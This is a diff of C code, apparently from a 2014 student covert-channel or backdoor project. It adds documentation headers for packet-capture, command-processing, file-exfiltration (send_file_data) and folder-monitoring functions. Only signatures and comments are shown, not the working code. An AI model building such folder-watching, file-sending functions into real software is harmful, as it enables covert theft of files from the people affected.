@@ -13,11 +13,11 @@ static volatile sig_atomic_t doneflag = 0;
 -- 
 -- PROGRAMMER: Luke Tao, Ian Lee
 -- 
--- INTERFACE: int startPacketCapture(pcap_t * nic_descr, struct bpf_program fp, int dst, char * src_host, int port)
+-- INTERFACE: int startPacketCapture(pcap_t * nic_descr, struct bpf_program fp, int dst, char * src_host, int port, int protocol)
 -- 
 -- RETURNS: 0, not important
 -- 
--- NOTES: Initializes packet capture on dst port or src host
+-- NOTES: Initializes packet capture on dst port or src host based on protocol
 ----------------------------------------------------------------------------------------------------------------------*/
 int startPacketCapture(pcap_t * nic_descr, struct bpf_program fp, int dst, char * src_host, int port, int protocol){
 	
@@ -374,7 +374,23 @@ int process_command(char * command, const struct ip_struct * ip, const int dest_
 	
 	return 0;
 }
-
+/*--------------------------------------------------------------------------------------------------------------------
+-- FUNCTION: send_file_data
+-- 
+-- DATE: 2014/11/26
+-- 
+-- REVISIONS: (Date and Description)
+-- 
+-- DESIGNER: Luke Tao, Ian Lee
+-- 
+-- PROGRAMMER: Luke Tao, Ian Lee
+-- 
+-- INTERFACE: int send_file_data(const char* folder, const char * fileName, const char * src_ip, const char * dest_ip, const int dest_port, int protocol)
+-- 
+-- RETURNS: 0
+-- 
+-- NOTES: reads specified file and sends contents to specified destination.
+----------------------------------------------------------------------------------------------------------------------*/
 int send_file_data(const char* folder, const char * fileName, const char * src_ip, const char * dest_ip, const int dest_port, int protocol){
 	FILE* fp;
 	char data[PKT_SIZE];
@@ -434,7 +450,23 @@ int send_file_data(const char* folder, const char * fileName, const char * src_i
 	return 0;
 }
 
-
+/*--------------------------------------------------------------------------------------------------------------------
+-- FUNCTION: initFileMonitor
+-- 
+-- DATE: 2014/11/26
+-- 
+-- REVISIONS: (Date and Description)
+-- 
+-- DESIGNER: Luke Tao, Ian Lee
+-- 
+-- PROGRAMMER: Luke Tao, Ian Lee
+-- 
+-- INTERFACE: int initFileMonitor(struct filelist* folder, const char* src_ip, const char* dest_ip, const int dest_port, int protocol)
+-- 
+-- RETURNS: 0
+-- 
+-- NOTES: initialize file monitoring of specified folders. On events, send file info to send_file_data function
+----------------------------------------------------------------------------------------------------------------------*/
 int initFileMonitor(struct filelist* folder, const char* src_ip, const char* dest_ip, const int dest_port, int protocol){
 
 	
